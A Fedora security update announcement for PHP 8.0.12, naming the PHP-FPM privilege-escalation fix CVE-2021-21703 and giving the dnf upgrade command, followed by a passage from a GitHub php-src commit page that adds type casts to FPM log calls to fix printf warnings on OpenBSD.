=== Content from lists.fedoraproject.org_d039174b_20250114_195331.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3.mbox.gz?message=6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3 "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3/#6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3)

# [SECURITY] Fedora 35 Update: php-8.0.12-2.fc35

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

3 Nov
2021

3 Nov
'21

1:12 a.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2021-02d218c3be
2021-11-03 01:10:35.196085
--------------------------------------------------------------------------------

Name : php
Product : Fedora 35
Version : 8.0.12
Release : 2.fc35
URL : <http://www.php.net/>
Summary : PHP scripting language for creating dynamic web sites
Description :
PHP is an HTML-embedded scripting language. PHP attempts to make it
easy for developers to write dynamically generated web pages. PHP also
offers built-in database integration for several commercial and
non-commercial database management systems, so writing a
database-enabled webpage with PHP is fairly simple. The most common
use of PHP coding is probably as a replacement for CGI scripts.

--------------------------------------------------------------------------------
Update Information:

\*\*PHP version 8.0.12\*\* (21 Oct 2021) \*\*CLI:\*\* \* Fixed bug php#81496 (Server
logs incorrect request method). (lauri) \*\*Core:\*\* \* Fixed bug php#81435
(Observer current\_observed\_frame may point to an old (overwritten) frame). (Bob)
\* Fixed bug php#81380 (Observer may not be initialized properly). (krakjoe)
\*\*DOM:\*\* \* Fixed bug php#81433 (DOMElement::setIdAttribute() called twice may
remove ID). (Viktor Volkov) \*\*FFI:\*\* \* Fixed bug php#79576 ("TYPE \*" shows
unhelpful message when type is not defined). (Dmitry) \*\*FPM:\*\* \* Fixed bug
php#81026 (PHP-FPM oob R/W in root process leading to privilege escalation)
(\*\*CVE-2021-21703\*\*). (Jakub Zelenka) \*\*Fileinfo:\*\* \* Fixed bug php#78987
(High memory usage during encoding detection). (Anatol) \*\*Filter:\*\* \* Fixed
bug php#61700 (FILTER\_FLAG\_IPV6/FILTER\_FLAG\_NO\_PRIV|RES\_RANGE failing). (cmb,
Nikita) \*\*Opcache:\*\* \* Fixed bug php#81472 (Cannot support large linux
major/minor device number when read /proc/self/maps). (Lin Yang)
\*\*Reflection:\*\* \* ReflectionAttribute is no longer final. (sasezaki) \*\*SPL:\*\*
\* Fixed bug php#80663 (Recursive SplFixedArray::setSize() may cause double-
free). (cmb, Nikita, Tyson Andre) \* Fixed bug php#81477 (LimitIterator +
SplFileObject regression in 8.0.1). (cmb) \*\*Standard:\*\* \* Fixed bug php#69751
(Change Error message of sprintf/printf for missing/typo position specifier).
(Aliaksandr Bystry) \*\*Streams:\*\* \* Fixed bug php#81475 (stream\_isatty emits
warning with attached stream wrapper). (cmb) \*\*XML:\*\* \* Fixed bug php#70962
(XML\_OPTION\_SKIP\_WHITE strips embedded whitespace). (Aliaksandr Bystry, cmb)
--------------------------------------------------------------------------------
ChangeLog:

\* Tue Oct 19 2021 Remi Collet remi@remirepo.net - 8.0.12-2
- dba: enable qdbm backend
\* Tue Oct 19 2021 Remi Collet remi@remirepo.net - 8.0.12-1
- Update to 8.0.12 - <http://www.php.net/releases/8_0_12.php>
- build using system libxcrypt
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2016535 - CVE-2021-21703 php: Local privilege escalation via PHP-FPM
<https://bugzilla.redhat.com/show_bug.cgi?id=2016535>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2021-02d218c3be' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3/#6PZVLICZUJMXOGWOUWSBAEGIVTF6Y6V3)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from github.com_346a6acf_20250115_115351.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ff71810fb6f98251ace18ba49bc269d19ab27579a)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ff71810fb6f98251ace18ba49bc269d19ab27579a)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  563](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/f71810fb6f98251ace18ba49bc269d19ab27579a)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix some FPM printf warnings on openbsd

[Browse files](/php/php-src/tree/f71810fb6f98251ace18ba49bc269d19ab27579a)
Browse the repository at this point in the history

```
Closes [GH-7585](https://github.com/php/php-src/pull/7585).
```

* Loading branch information

[![@devnexen](https://avatars.githubusercontent.com/u/4922778?s=40&v=4)](/devnexen) [![@nikic](https://avatars.githubusercontent.com/u/216080?s=40&v=4)](/nikic)

[devnexen](/php/php-src/commits?author=devnexen "View all commits by devnexen")
authored and
[nikic](/php/php-src/commits?author=nikic "View all commits by nikic")
committed
Oct 18, 2021

1 parent
[e26abe6](/php/php-src/commit/e26abe631c5c7722db7c059aaa896bdfd3a9fdb2)

commit f71810f

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**3 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* sapi/fpm/fpm

  + sapi/fpm/fpm/fpm\_children.c
    [fpm\_children.c](#diff-bc9e3a640014947c1b61c24965278aed577c94f2bdb7239ab7ac360ab8c4ce36)
  + sapi/fpm/fpm/fpm\_log.c
    [fpm\_log.c](#diff-0bcfdc3368722302ff6ac2ed9cab9fc41be98d19eb58fc3417b3cfa829fa3070)

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[sapi/fpm/fpm/fpm\_children.c](#diff-bc9e3a640014947c1b61c24965278aed577c94f2bdb7239ab7ac360ab8c4ce36 "sapi/fpm/fpm/fpm_children.c")

Show comments

[View file](/php/php-src/blob/f71810fb6f98251ace18ba49bc269d19ab27579a/sapi/fpm/fpm/fpm_children.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -256,9 +256,9 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  |  | if (!fpm\_pctl\_can\_spawn\_children()) { |
|  |  | severity = ZLOG\_DEBUG; |
|  |  | } |
|  |  | zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, (long) tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | } else { |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, (long) tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | } |
|  |  |  |
|  |  | fpm\_child\_close(child, 1 /\* in event\_loop \*/); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[sapi/fpm/fpm/fpm\_log.c](#diff-0bcfdc3368722302ff6ac2ed9cab9fc41be98d19eb58fc3417b3cfa829fa3070 "sapi/fpm/fpm/fpm_log.c")

Show comments

[View file](/php/php-src/blob/f71810fb6f98251ace18ba49bc269d19ab27579a/sapi/fpm/fpm/fpm_log.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -217,7 +217,7 @@ int fpm\_log\_write(char \*log\_format) /\* {{{ \*/ |
|  |  | /\* microseconds \*/ |
|  |  | } else if (!strcasecmp(format, "microseconds") || !strcasecmp(format, "micro")) { |
